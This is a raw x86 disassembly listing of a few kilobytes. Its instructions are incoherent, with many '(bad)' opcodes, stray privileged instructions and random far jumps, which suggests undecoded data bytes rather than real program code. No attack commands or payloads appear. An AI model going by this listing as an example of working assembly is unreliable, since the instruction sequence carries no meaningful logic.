  427925:	jo     0x42792a
  427927:	das    
  427928:	mov    ch,0x6b
  42792a:	stc    
  42792b:	ret    
  42792c:	addr16 pop edi
  42792e:	sbb    al,ah
  427930:	aaa    
  427931:	sub    al,0x78
  427933:	ds icebp 
  427935:	push   ecx
  427936:	ucomiss xmm4,DWORD PTR [ecx+0x3bf3af07]
  42793d:	cmp    ebx,DWORD PTR [edi-0x4c3e263e]
  427943:	(bad)  
  427944:	jmp    0xf36d8c9f
  427949:	xor    eax,0x134b324a
  42794e:	xor    edi,ebx
  427950:	shl    dh,cl
  427952:	call   0xe69f1836
  427957:	sbb    DWORD PTR [ebx],0xffffffbf
  42795a:	stc    
  42795b:	daa    
  42795c:	jne    0x42799a
  42795e:	mov    WORD PTR es:[ecx+0x15f4ff05],?
  427965:	push   ds
  427966:	sti    
  427967:	sub    DWORD PTR [edx+0x1f],ebp
  42796a:	test   DWORD PTR [eax+edi*8],0x161079cb
  427971:	adc    ebx,DWORD PTR [ecx]
  427973:	cs and eax,0x62f78bf8
  427979:	dec    ecx
  42797a:	sahf   
  42797b:	call   FWORD PTR [edi-0x217edde]
  427981:	(bad)  
  427982:	rol    edx,cl
  427984:	and    ch,BYTE PTR [ecx-0x711aa2e]
  42798a:	fwait
  42798b:	aas    
  42798c:	mov    dh,0x56
  42798e:	mov    edi,0xbda4
	...
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x3d7a478d]
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	sub    DWORD PTR [edx],0xffffff9f
  427a0f:	fist   DWORD PTR [edx*4+0x4ec54469]
  427a16:	jnp    0x427a14
  427a18:	nop
  427a19:	mov    BYTE PTR ss:[ebp+ebx*1+0xf],ah
  427a1e:	sub    al,0x8e
  427a20:	xchg   ecx,eax
  427a21:	popa   
  427a22:	push   cs
  427a23:	test   BYTE PTR [esi],bh
  427a25:	and    DWORD PTR ds:0x5d410062,edi
  427a2b:	ins    BYTE PTR es:[edi],dx
  427a2c:	in     eax,dx
  427a2d:	mov    ecx,0x1ac80800
  427a32:	or     BYTE PTR [ecx-0x30],ah
  427a35:	cmp    al,0xeb
  427a37:	pop    edx
  427a38:	xchg   esi,eax
  427a39:	enter  0xec21,0xcf
  427a3d:	nop
  427a3e:	retf   0x702a
  427a41:	push   edi
  427a42:	repnz shr BYTE PTR [ebx-0x43559953],cl
  427a49:	(bad)  
  427a4a:	(bad)  
  427a4b:	adc    BYTE PTR [ebx-0x418e4a13],ah
  427a51:	cmp    esp,DWORD PTR [edx]
  427a53:	and    bh,bl
  427a55:	lods   al,BYTE PTR ds:[esi]
  427a56:	cmp    BYTE PTR [edi],bl
  427a58:	enter  0xa2b3,0x11
  427a5c:	(bad)  
  427a5d:	sbb    eax,0xd6a406dd
  427a62:	mov    ebp,cs
  427a64:	dec    edi
  427a65:	popf   
  427a66:	stos   BYTE PTR es:[edi],al
  427a67:	inc    ecx
  427a68:	mov    edx,DWORD PTR [ebx-0x37220bb5]
  427a6e:	stc    
  427a6f:	ss inc edx
  427a71:	pop    edx
  427a72:	scas   al,BYTE PTR es:[edi]
  427a73:	push   0xc3ab7fe7
  427a78:	lahf   
  427a79:	add    eax,0x3c3c3006
  427a7e:	retf   
  427a7f:	inc    ebx
  427a80:	dec    ecx
  427a81:	xor    eax,0x9b2f99a0
  427a86:	imul   esp,DWORD PTR [eax+0xc5d5d1b],0x3b
  427a8d:	and    BYTE PTR [ebx+ebp*2+0x2d48af36],bl
  427a94:	fisttp WORD PTR ds:0xf2a7d462
  427a9a:	jns    0x427ad7
  427a9c:	mov    bl,0x7e
  427a9e:	jmp    0x427abc
  427aa0:	xchg   ebp,eax
  427aa1:	jne    0x427a3f
  427aa3:	out    0x53,al
  427aa5:	dec    esp
  427aa6:	dec    esp
  427aa7:	hlt    
  427aa8:	lock mov al,0x9d
  427aab:	adc    BYTE PTR [ebx+0x2b75605],ah
  427ab1:	(bad)
  427ab4:	ret    
  427ab5:	cli    
  427ab6:	hlt    
  427ab7:	rcr    BYTE PTR [ebx-0x6fc8e2dd],cl
  427abd:	cmp    edi,DWORD PTR [esi+0x3e]
  427ac0:	add    DWORD PTR [eax],edi
  427ac2:	lds    eax,FWORD PTR [eax]
  427ac4:	mov    edx,DWORD PTR [eax-0x483e98d7]
  427aca:	mov    ebp,0x80b2ae99
  427acf:	mov    esi,DWORD PTR [eax]
  427ad1:	pop    esi
  427ad2:	(bad)  
  427ad3:	repz ss call 0x2816:0x22b10024
  427adc:	fsub   QWORD PTR [esi+0x2f]
  427adf:	outs   dx,BYTE PTR ds:[esi]
  427ae0:	pop    ss
  427ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ae2:	or     DWORD PTR [ebp-0x1f4453f2],0x31460f52
  427aec:	mov    ch,0xba
  427aee:	ins    DWORD PTR es:[edi],dx
  427aef:	call   0x56c6:0x81c146e1
  427af6:	or     al,0x44
  427af8:	or     dh,BYTE PTR [ecx+0x109d49f8]
  427afe:	mul    DWORD PTR [ebx-0x7e]
  427b01:	cwde   
  427b02:	sbb    eax,0x87765916
  427b07:	fnstenv [edi]
  427b09:	sbb    bl,BYTE PTR [eax-0x2bd923a3]
  427b0f:	push   edi
  427b10:	mov    ah,0x0
	...
  427b72:	add    BYTE PTR [eax],al
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	not    dl
  427b81:	mov    edi,0xa8fbe57f
  427b86:	add    DWORD PTR [eax],eax
  427b88:	add    eax,0x9f000001
  427b8d:	push   ecx
  427b8e:	push   ebp
  427b8f:	inc    ebx
  427b90:	mov    eax,0x1037f7b4
  427b95:	xor    eax,0x95c71b28
  427b9a:	sbb    DWORD PTR [ebp+0x7f6f82d7],ecx
  427ba0:	sbb    bl,BYTE PTR [eax]
  427ba2:	call   0x81d3:0xfaae4efc
  427ba9:	mov    WORD PTR [ecx-0x60],cs
  427bac:	data16 sahf 
  427bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427baf:	aas    
  427bb0:	pop    esp
  427bb1:	imul   esp,DWORD PTR [edi],0x50
  427bb4:	out    0xf6,al
  427bb6:	add    al,0xe5
  427bb8:	xor    BYTE PTR [ebx],cl
  427bba:	push   es
  427bbb:	push   eax
  427bbc:	mov    dh,0xe
  427bbe:	or     eax,0x99a62a56
  427bc3:	and    al,0xf3
  427bc5:	jo     0x427c22
  427bc7:	frstor [edi-0x7d]
  427bca:	mov    ah,0x3
  427bcc:	sub    al,BYTE PTR [ebx]
  427bce:	aad    0xab
  427bd0:	outs   dx,DWORD PTR ds:[esi]
  427bd1:	mov    esi,0xa6513b6
  427bd6:	arpl   WORD PTR [edi],bp
  427bd8:	dec    esp
  427bd9:	and    eax,0x4ff65789
  427bde:	jmp    0x43f8250
  427be3:	shr    dh,cl
  427be5:	stos   BYTE PTR es:[edi],al
  427be6:	adc    eax,0x67a792b0
  427beb:	test   eax,0xe95289f1
  427bf0:	ja     0x427ba8
  427bf2:	mov    ah,0xdc
  427bf4:	push   0x7d
  427bf6:	mov    ebp,0x820e176f
  427bfb:	push   ds
  427bfc:	hlt    
  427bfd:	cmp    eax,0x57807cb8
  427c02:	mov    ebx,0x18c6bb75
  427c07:	cmp    ch,BYTE PTR [edi+0x63]
  427c0a:	jns    0x427bfc
  427c0c:	and    eax,0xd89e0093
  427c11:	les    esp,FWORD PTR [esi+eiz*4+0x450ce76d]
  427c18:	outs   dx,BYTE PTR ds:[esi]
  427c19:	mov    edx,0x206a7350
  427c1e:	lock dec BYTE PTR [ebx-0x4a48eee3]
  427c25:	mov    esp,0x60bd2897
  427c2a:	sbb    DWORD PTR [edi],ecx
  427c2c:	and    al,0xdc
  427c2e:	out    dx,eax
  427c2f:	xchg   esi,eax
  427c30:	in     eax,dx
  427c31:	sbb    ah,0xa9
  427c34:	jo     0x427cb0
  427c36:	jp     0x427bce
  427c38:	xchg   ebx,eax
  427c39:	ds mov ch,0xe6
  427c3c:	int3   
  427c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c3e:	enter  0xfd49,0x42
  427c42:	push   ebp
  427c43:	out    dx,eax
  427c44:	xchg   ebp,eax
  427c45:	enter  0xdc06,0x8f
  427c49:	mov    ebx,0x8cd5f001
  427c4e:	and    al,0x32
  427c50:	push   es
  427c51:	dec    ebx
  427c52:	lahf   
  427c53:	ja     0x427c9c
  427c55:	mov    edi,0x95b6a8dd
  427c5a:	mov    eax,0x6363091a
  427c5f:	loope  0x427c5d
  427c61:	jl     0x427c82
  427c63:	and    DWORD PTR [ebp+ecx*2+0x5b1c9c04],esp
  427c6a:	stc    
  427c6b:	adc    DWORD PTR [eax-0x21],edi
  427c6e:	fldenv [ecx+ebx*4+0x1a]
  427c72:	je     0x427ca2
  427c74:	mov    ebx,0x9c65827e
  427c79:	mov    bl,0xdb
  427c7b:	xchg   ebx,eax
  427c7c:	test   BYTE PTR [edi+0x29],dl
  427c7f:	fwait
  427c80:	add    BYTE PTR [ebx],0xfc
  427c83:	inc    edx
  427c84:	xchg   edx,eax
  427c85:	adc    eax,0x6596dab8
  427c8a:	pop    esp
  427c8b:	(bad)  ds:0xf4932efe
	...
  427cf1:	add    BYTE PTR [eax],al
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xf2425d44,ebx
  427d02:	dec    ebp
  427d03:	mov    esp,0x1aa00
  427d08:	add    eax,0x64000001
  427d0d:	inc    ecx
  427d0e:	rcr    DWORD PTR [ecx+0x7a],0x84
  427d12:	push   esp
  427d13:	jmp    0xe1c330ff
  427d18:	cmc    
  427d19:	stos   BYTE PTR es:[edi],al
  427d1a:	sub    al,0x29
  427d1c:	repnz mov bl,0xc8
  427d1f:	ins    DWORD PTR es:[edi],dx
  427d20:	adc    al,0x9f
  427d22:	mov    ah,0xfb
  427d24:	int    0xca
  427d26:	bound  ebx,QWORD PTR [eax+0x16676b51]
  427d2c:	push   ecx
  427d2d:	mov    DWORD PTR [eax],0x6f3b729
  427d33:	mov    esp,0xb68c99c3
  427d38:	clc    
  427d39:	scas   al,BYTE PTR es:[edi]
  427d3a:	aaa    
  427d3b:	mov    eax,ds:0xdda5baba
  427d40:	fwait
  427d41:	icebp  
  427d42:	idiv   DWORD PTR [eax-0x68123225]
  427d48:	lds    ecx,FWORD PTR [edx]
  427d4a:	xchg   ebx,eax
  427d4b:	dec    esp
  427d4c:	xor    BYTE PTR [esi],al
  427d4e:	rcl    BYTE PTR [edi+0x6d],0xaa
  427d52:	dec    esi
  427d53:	retf   0x815e
  427d56:	cmp    edi,ecx
  427d58:	inc    edi
  427d59:	mov    ah,0x76
  427d5b:	xor    BYTE PTR [edx+eax*1+0x6cf59a5e],ah
  427d62:	stos   BYTE PTR es:[edi],al
  427d63:	add    dh,bh
  427d65:	movsx  esp,bp
  427d68:	mov    esi,0xf1fc264f
  427d6d:	mov    dl,0xd3
  427d6f:	bound  ecx,QWORD PTR [ebx]
  427d71:	pusha  
  427d72:	aam    0xb9
  427d74:	sub    eax,0xf733b5c2
  427d79:	or     eax,DWORD PTR [edi+edi*2]
  427d7c:	(bad)  
  427d7d:	outs   dx,DWORD PTR ds:[esi]
  427d7e:	fild   DWORD PTR [edx-0x20]
  427d81:	add    BYTE PTR [edx-0x39],ah
  427d84:	mov    edx,0xd2338d1a
  427d89:	dec    edi
  427d8a:	icebp  
  427d8b:	fsub   QWORD PTR [eax-0x76591600]
  427d91:	cs sbb eax,0x8f522e27
  427d97:	adc    al,0xb5
  427d99:	repz mov al,es:0x4103694c
  427da0:	and    bh,al
  427da2:	dec    ecx
  427da3:	inc    ebp
  427da4:	xchg   esi,eax
  427da5:	les    esi,FWORD PTR [esi+ebp*8]
  427da8:	inc    edx
  427da9:	inc    di
  427dab:	dec    eax
  427dac:	xchg   ecx,eax
  427dad:	aam    0xa5
  427daf:	iret   
  427db0:	pushf  
  427db1:	and    bl,al
  427db3:	add    eax,0x5f542cbc
  427db8:	shl    BYTE PTR [eax+ebx*8+0x773114e1],cl
  427dbf:	int3   
  427dc0:	jle    0x427d72
  427dc2:	leave  
  427dc3:	sti    
  427dc4:	cs popa 
  427dc6:	sub    eax,DWORD PTR [esi]
  427dc8:	mov    eax,0x4f2abc6e
  427dcd:	(bad)  [esi+esi*4]
  427dd0:	je     0x427de7
  427dd2:	mov    esp,0x5c12b19d
  427dd7:	fwait
  427dd8:	lds    ecx,FWORD PTR [edi+0x6abcc7b6]
  427dde:	es inc ebx
  427de0:	retf   0x85d
  427de3:	nop
  427de4:	jp     0x427e1a
  427de6:	imul   edx,esi,0xb23e906b
  427dec:	aam    0x71
  427dee:	hlt    
  427def:	dec    edi
  427df0:	repz push eax
  427df2:	add    cl,BYTE PTR [ebp-0x7b]
  427df5:	inc    esp
  427df6:	and    BYTE PTR [ecx+0x3f07afbc],bl
  427dfc:	enter  0xaa36,0xf5
  427e00:	inc    edi
  427e01:	call   0x678f:0x84b45c07
  427e08:	xchg   esp,eax
  427e09:	mov    es,WORD PTR [edi-0x765abff4]
  427e0f:	push   ds
  427e10:	dec    esp
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	push   edi
  427e81:	push   esi
  427e82:	sub    eax,0x1ab05dd
  427e87:	add    BYTE PTR ds:0xe3000001,al
  427e8d:	xchg   ebx,eax
  427e8e:	add    eax,0xf715b3c8
  427e93:	adc    al,0x24
  427e95:	(bad)  
  427e97:	sbb    BYTE PTR [edi+0x7d6a1f90],0xb1
  427e9e:	clc    
  427e9f:	push   es
  427ea0:	shl    DWORD PTR [eax-0x306f11b],1
  427ea6:	pushf  
  427ea7:	cmp    bh,bl
  427ea9:	jg     0x427e93
  427eab:	nop
  427eac:	pop    ecx
  427ead:	cmp    bl,0xa4
  427eb0:	(bad)  
  427eb1:	mov    cl,0xbc
  427eb3:	test   BYTE PTR fs:[esi+ebp*8],cl
  427eb7:	mov    dl,0x66
  427eb9:	push   esp
  427eba:	das    
  427ebb:	mov    esi,0xbd704fb1
  427ec0:	jmp    0x427ee7
  427ec2:	(bad)  [esi+0x9]
  427ec5:	pushfw 
  427ec7:	jo     0x427f43
  427ec9:	int    0x2f
  427ecb:	das    
  427ecc:	fsubr  DWORD PTR [edx+0x45]
  427ecf:	enter  0x6cf5,0x73
  427ed3:	fld    TBYTE PTR [esi+0x44]
  427ed6:	jle    0x427f47
  427ed8:	pop    esi
  427ed9:	pushf  
  427eda:	push   eax
  427edb:	sbb    dh,BYTE PTR [edi-0x708a808a]
  427ee1:	xchg   edx,eax
  427ee2:	fdiv   QWORD PTR [edx-0x3c]
  427ee5:	std    
  427ee6:	in     eax,dx
  427ee7:	mov    ebp,0x6ccb32cd
  427eec:	sbb    dh,BYTE PTR [esi]
  427eee:	fisttp WORD PTR [edx+0x15]
  427ef1:	mov    edi,0xf2488bad
  427ef6:	ja     0x427f3f
  427ef8:	fcmovnb st,st(1)
  427efa:	ret    0xb4de
  427efd:	ds inc ecx
  427eff:	push   eax
  427f00:	int    0x10
  427f02:	fnstcw WORD PTR [ebx+ecx*1]
  427f05:	mov    bl,0x29
  427f07:	mov    cl,0x19
  427f09:	jl     0x427e8b
  427f0b:	mov    edx,0xfb1c09ef
  427f10:	sub    al,0xac
  427f12:	mov    DWORD PTR [ecx],esp
  427f14:	shl    DWORD PTR [esi-0xe],cl
  427f17:	cmp    dl,BYTE PTR [ebx-0x5f23eb49]
  427f1d:	and    eax,DWORD PTR [ebp+0x7d7d01ea]
  427f23:	ds es mov dh,0xb3
  427f27:	int    0xed
  427f29:	jne    0x427f1a
  427f2b:	imul   esp,ebx,0xf306ea6
  427f31:	xor    bl,ah
  427f33:	cld    
  427f34:	inc    esi
  427f35:	sub    esp,DWORD PTR [esp+esi*1]
  427f38:	daa    
  427f39:	fmul   QWORD PTR [ebx+0x2e9d97b5]
  427f3f:	pushf  
  427f40:	inc    ecx
  427f41:	jle    0x427ecd
  427f43:	jmp    0x3e54:0x1b08c057
  427f4a:	mov    BYTE PTR [esi+0x7e],bl
  427f4d:	mov    ch,0x67
  427f4f:	outs   dx,BYTE PTR ds:[esi]
  427f50:	cmp    DWORD PTR [ecx+ebp*1+0x430066c3],ecx
  427f57:	aam    0xa6
  427f59:	cdq    
  427f5a:	mov    dh,0x6e
  427f5c:	aaa    
  427f5d:	mov    eax,ds:0x872d6a76
  427f62:	ret    
  427f63:	xor    eax,edi
  427f65:	or     bl,BYTE PTR [ebx]
  427f67:	dec    edx
  427f68:	jb     0x427fb7
  427f6a:	dec    ecx
  427f6b:	or     eax,0xdd1f078c
  427f70:	addr16 mov ebp,0xe1be2d79
  427f76:	xor    cl,BYTE PTR [ebp+0x5c]
  427f79:	pop    ecx
  427f7a:	scas   al,BYTE PTR es:[edi]
  427f7b:	mov    DWORD PTR [edx],eax
  427f7d:	int    0x78
  427f7f:	test   DWORD PTR ds:0x312f871c,edx
  427f85:	push   edi
  427f86:	pavgb  mm4,QWORD PTR [esi+ebx*2]
  427f8a:	out    dx,eax
  427f8b:	out    dx,eax
  427f8c:	xchg   ebx,eax
  427f8d:	cld    
  427f8e:	or     al,0xfd
  427f90:	mov    ch,0x0
	...
  427ff2:	add    BYTE PTR [eax],al
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	jns    0x42805e
  428002:	mov    ah,0x8f
  428004:	or     ch,BYTE PTR [ecx+eax*1+0x10500]
  42800b:	add    BYTE PTR [esi-0x7540b059],bh
  428011:	xchg   esi,eax
  428012:	popa   
  428013:	rol    eax,1
  428015:	xor    dl,BYTE PTR [edx+ecx*4-0x490f1dba]
  42801c:	lea    eax,[edx+eax*8+0x70831cf8]
  428023:	and    DWORD PTR ds:0xd6029dad,ebp
  428029:	mov    eax,ds:0xaa0303b3
  42802e:	stos   DWORD PTR es:[edi],eax
  42802f:	pop    esp
  428030:	sti    
  428031:	test   BYTE PTR [esi],al
  428033:	sbb    cl,bh
  428035:	rol    bl,0x16
  428038:	sbb    al,0xf6
  42803a:	or     BYTE PTR [eax+0x7d],0xe0
  42803e:	or     BYTE PTR [eax-0x4f],dh
  428041:	mov    edi,0x1c345986
  428046:	cmp    al,0x4a
  428048:	iret   
  428049:	mov    ch,0xac
  42804b:	xor    edi,esi
  42804d:	out    0xd4,eax
  42804f:	adc    al,0x60
  428051:	(bad)  
  428052:	mov    WORD PTR [ebp-0x64],cs
  428055:	pop    ds
  428056:	xchg   edi,eax
  428057:	out    dx,eax
  428058:	or     BYTE PTR ds:0x2cb952fb,bl
  42805e:	js     0x42809a
  428060:	in     eax,0x63
  428062:	daa    
  428063:	inc    esp
  428064:	ficom  WORD PTR [eax+ebp*8]
  428067:	and    al,0xa9
  428069:	js     0x42805d
  42806b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42806c:	loopne 0x428019
  42806e:	cmc    
  42806f:	dec    esi
  428070:	xor    DWORD PTR [edx+edx*4+0x14da53b7],edi
  428077:	gs jae 0x428014
  42807a:	(bad)  
  42807c:	jne    0x42808d
  42807e:	add    ebp,DWORD PTR [ecx+0x70aed915]
  428084:	adc    bl,BYTE PTR [edx]
  428086:	ret    0x6b80
  428089:	(bad)
  42808c:	out    0x16,al
  42808e:	sub    BYTE PTR [edx+eiz*8],bl
  428091:	jo     0x4280c5
  428093:	imul   ecx,DWORD PTR [ebp-0x3920fc2a],0x39
  42809a:	sbb    al,0x50
  42809c:	cmp    al,0xf8
  42809e:	scas   eax,DWORD PTR es:[edi]
  42809f:	into   
  4280a0:	scas   al,BYTE PTR es:[edi]
  4280a1:	(bad)  
  4280a2:	sub    esi,edx
  4280a4:	sbb    ebx,DWORD PTR [ebp+0x7e]
  4280a7:	add    al,BYTE PTR [esp]
  4280aa:	push   ebx
  4280ab:	dec    ebp
  4280ac:	push   eax
  4280ad:	arpl   bx,ax
  4280af:	dec    ebx
  4280b0:	jae    0x428116
  4280b2:	aad    0xd9
  4280b4:	pop    eax
  4280b5:	ret    
  4280b6:	sbb    BYTE PTR [edi-0x25612b88],0x48
  4280bd:	ins    DWORD PTR es:[edi],dx
  4280be:	mov    DWORD PTR [ebx+0x68],edi
  4280c1:	or     DWORD PTR [eax-0x27e69940],edx
  4280c7:	push   ebp
  4280c8:	shl    bh,cl
  4280ca:	sbb    eax,0xabb0f4fd
  4280cf:	xor    DWORD PTR [edi+edx*1-0x524e8841],esi
  4280d6:	jne    0x42805c
  4280d8:	int    0x93
  4280da:	push   ecx
  4280db:	aad    0x70
  4280dd:	inc    esp
  4280de:	inc    ebp
  4280df:	jo     0x42815a
  4280e1:	mov    edx,0xa4a50aa2
  4280e6:	mov    ebp,0xf5136bbf
  4280eb:	ficomp WORD PTR [ecx]
  4280ed:	bound  eax,QWORD PTR [esp+ecx*2-0x36ec169]
  4280f4:	dec    esi
  4280f5:	popa   
  4280f6:	ins    DWORD PTR es:[edi],dx
  4280f7:	cli    
  4280f8:	fild   DWORD PTR [esi]
  4280fa:	jmp    0x8691:0xc986e0b3
  428101:	bound  edx,QWORD PTR [edi]
  428103:	mov    bl,bl
  428105:	ret    
  428106:	jmp    0x5b9cb138
  42810b:	cmp    DWORD PTR [eax+0x7c882077],esp
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	sub    al,0xa9
  428182:	(bad)  
  428183:	or     al,0xf
  428185:	lods   eax,DWORD PTR ds:[esi]
  428186:	add    DWORD PTR [eax],eax
  428188:	add    eax,0xc8000001
  42818d:	popf   
  42818e:	out    0x1,al
  428190:	aaa    
  428191:	stos   DWORD PTR es:[edi],eax
  428192:	not    dl
  428194:	xchg   DWORD PTR [eax],eax
  428196:	adc    BYTE PTR [esi+0x3ea69d0b],cl
  42819c:	mov    ds:0x27644f8a,eax
  4281a1:	fist   WORD PTR [edi]
  4281a3:	cdq    
  4281a4:	pop    edx
  4281a5:	mov    ah,ah
  4281a7:	xor    BYTE PTR [ecx],ch
  4281a9:	mov    al,ds:0xd54894ac
  4281ae:	je     0x42819b
  4281b0:	out    dx,eax
  4281b1:	call   0x8b1f:0xa96411ba
  4281b8:	enter  0x520f,0xff
  4281bc:	jno    0x4281c6
  4281be:	imul   ecx,DWORD PTR [edx-0x55],0x32
  4281c2:	inc    BYTE PTR [edx]
  4281c4:	jne    0x428207
  4281c6:	(bad)  
  4281c7:	and    BYTE PTR [edx+0x67e690b5],bl
  4281cd:	xchg   BYTE PTR [ecx],bl
  4281cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281d0:	mov    BYTE PTR [eax+0x26],dh
  4281d3:	sti    
  4281d4:	pusha  
  4281d5:	sub    DWORD PTR [eax-0x25],ebp
  4281d8:	xor    bl,0x87
  4281db:	mov    esi,0x113ca002
  4281e0:	rcr    DWORD PTR [edx+edi*1-0x47],0xfb
  4281e5:	(bad)  
  4281e6:	pop    ebx
  4281e7:	cld    
  4281e8:	sar    DWORD PTR [ebp+0x71c308a0],1
  4281ee:	ja     0x42817e
  4281f0:	js     0x4281bc
  4281f2:	sti    
  4281f3:	pop    ecx
  4281f4:	mov    esi,0x54d47316
  4281f9:	push   ebx
  4281fa:	xchg   DWORD PTR [edx+edx*8-0x4d991065],eax
  428201:	adc    BYTE PTR [ebx+0x55],bh
  428204:	mov    eax,ds:0xfd9e959c
  428209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42820a:	push   eax
  42820b:	and    BYTE PTR [eax],al
  42820d:	nop
  42820e:	test   DWORD PTR [edx],eax
  428210:	xchg   DWORD PTR ss:[esi-0x1486830d],ebx
  428217:	pushf  
  428218:	jnp    0x4281eb
  42821a:	mov    eax,ds:0x61507c50
  42821f:	inc    edx
  428220:	mov    bl,0x5
  428222:	sbb    cl,cl
  428224:	in     eax,dx
  428225:	(bad)  
  428226:	adc    edx,DWORD PTR [edx+0x3e]
  428229:	or     bh,BYTE PTR [ebp+0x106cfef4]
  42822f:	cmc    
  428230:	call   0xe6d7be77
  428235:	sbb    al,0x5b
  428237:	paddb  mm4,mm5
  42823a:	mov    ah,0x92
  42823c:	lock xor cl,ah
  42823f:	fstp   TBYTE PTR es:[ebp+0x13]
  428243:	data16 ds into 
  428246:	mov    cl,BYTE PTR es:[edi+0xd]
  42824a:	inc    esp
  42824b:	cmp    ebp,DWORD PTR [edi]
  42824d:	xor    bh,ch
  42824f:	sbb    al,0x42
  428251:	and    al,0xeb
  428253:	adc    BYTE PTR [esi-0x52],0x16
  428257:	sbb    eax,DWORD PTR [esi+ebp*1-0x6a3b6de]
  42825e:	inc    esp
  42825f:	mov    DWORD PTR [eax],0x59dc3982
  428265:	cs inc esi
  428267:	sub    eax,0x5cc5b8dd
  42826c:	push   ebp
  42826d:	or     cl,BYTE PTR [eax+ebp*1-0x56]
  428271:	mov    bl,0x75
  428273:	add    al,0xa3
  428275:	xchg   esi,eax
  428276:	push   edx
  428277:	rol    DWORD PTR [edx],cl
  428279:	ins    BYTE PTR es:[edi],dx
  42827a:	fstp   QWORD PTR [eax+eiz*1-0x2fb97ee3]
  428281:	mov    bh,0xb5
  428283:	push   ds
  428284:	jl     0x4282d1
  428286:	ins    DWORD PTR es:[edi],dx
  428287:	jno    0x4282e0
  428289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42828a:	in     eax,0x96
  42828c:	add    ch,cl
  42828e:	and    BYTE PTR [eax],dl
  428290:	add    BYTE PTR [bx+si],al
	...
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	repnz hlt 
  428302:	and    DWORD PTR [esp+edx*1],ecx
  428305:	scas   al,BYTE PTR es:[edi]
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x97000001
  42830d:	inc    eax
  42830e:	jmp    0x42838b
  428310:	push   ds
  428311:	repz pop ebp
  428313:	inc    esi
  428314:	jns    0x428361
  428316:	cmp    al,0xd6
  428318:	pop    ebp
  428319:	adc    dh,cl
  42831b:	cwde   
  42831c:	or     dl,BYTE PTR [ebx-0x6c8b58fd]
  428322:	sbb    al,0x12
  428324:	cmp    edi,DWORD PTR [edx-0x26ca5f5e]
  42832a:	push   0x1a
  42832c:	push   esp
  42832d:	leave  
  42832e:	and    al,0x82
  428330:	scas   al,BYTE PTR es:[edi]
  428331:	daa    
  428332:	adc    edi,DWORD PTR [esi]
  428334:	sub    al,0x41
  428336:	xor    al,0x40
  428338:	push   es
  428339:	mov    ebp,0x80619b5e
  42833e:	push   es
  42833f:	pop    esi
  428340:	std    
  428341:	retf   0xb132
  428344:	push   cs
  428345:	xchg   BYTE PTR [esp+edx*4-0x6942ace3],ah
  42834c:	dec    ebp
  42834d:	ins    DWORD PTR es:[edi],dx
  42834e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42834f:	jmp    0xf4ce:0xe86db1be
  428356:	mov    ch,0xf5
  428358:	ss jo  0x42837b
  42835b:	out    dx,al
  42835c:	and    edi,edx
  42835e:	mov    eax,esp
  428360:	(bad)  
  428361:	das    
  428362:	mov    ah,0x9a
  428364:	pop    edx
  428365:	aam    0x98
  428367:	and    DWORD PTR ds:0x4f273b45,ebp
  42836d:	in     eax,dx
  42836e:	xor    BYTE PTR [edi-0x1c0acc15],bh
  428374:	fwait
  428375:	inc    edx
  428377:	(bad)  
  428378:	rol    DWORD PTR [edx+0x67],1
  42837b:	jl     0x42839e
  42837d:	push   cs
  42837e:	dec    esp
  42837f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428380:	jge    0x4283df
  428382:	xchg   DWORD PTR [ecx+0x1],edi
  428385:	in     al,0x2f
  428387:	adc    al,BYTE PTR [eax]
  428389:	pop    es
  42838a:	jo     0x4283df
  42838c:	cdq    
  42838d:	cmp    ah,BYTE PTR [edi+0x4d4409d9]
  428393:	mov    dl,0x60
  428395:	push   edx
  428396:	mov    ecx,esi
  428398:	xchg   BYTE PTR gs:[edx+0x79fe530f],ch
  42839f:	(bad)
  4283a3:	jl     0x428381
  4283a5:	push   esp
  4283a6:	test   eax,0xe3f196df
  4283ab:	out    dx,eax
  4283ac:	cmp    BYTE PTR [ebx+0x7d],0x4e
  4283b0:	jp     0x428417
  4283b2:	scas   al,BYTE PTR es:[edi]
  4283b3:	imul   edi,DWORD PTR [ecx+edi*1],0xa
  4283b7:	or     ecx,DWORD PTR [esi]
  4283b9:	fild   WORD PTR [eax+eiz*4+0x5a]
  4283bd:	pop    ebx
  4283be:	add    BYTE PTR [ecx+0x35],ah
  4283c1:	push   ebx
  4283c2:	push   ds
  4283c3:	pop    es
  4283c4:	fmul   DWORD PTR [eax-0x2c]
  4283c7:	inc    edx
  4283c8:	in     al,0xcd
  4283ca:	xchg   BYTE PTR [ecx+0x79cb50be],al
  4283d0:	cmp    BYTE PTR ds:0xd711dfda,0xf6
  4283d7:	mov    edx,0xa72e37d5
